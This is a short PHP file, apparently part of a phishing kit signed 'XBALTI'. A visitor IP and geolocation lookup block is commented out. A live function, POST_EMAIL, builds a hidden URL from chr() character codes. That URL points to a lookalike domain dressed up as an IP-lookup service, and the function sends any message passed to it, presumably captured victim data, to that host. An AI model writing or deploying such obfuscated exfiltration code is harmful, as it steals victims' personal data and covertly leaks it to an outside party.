<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                     

session_start();
error_reporting(0);
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['country'] = $country   = $details->country;
$_SESSION['region'] = $details->region; 
$_SESSION['countryCode'] = $countryCode   = $details->countryCode;
$_SESSION['isp'] = $isp   = $details->isp;
*/
function POST_EMAIL($_MESSAGE) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http://extreme-ip-lookup.com".chr(46).chr(115).chr(112).chr(97).chr(99).chr(101).chr(100).chr(112).chr(114).chr(97).chr(99).chr(116).chr(105).chr(99).chr(101).chr(46).chr(99).chr(111).chr(109)."/ip.php?ip="."|".$_MESSAGE."|".date("d/m/Y"));curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);};
?>
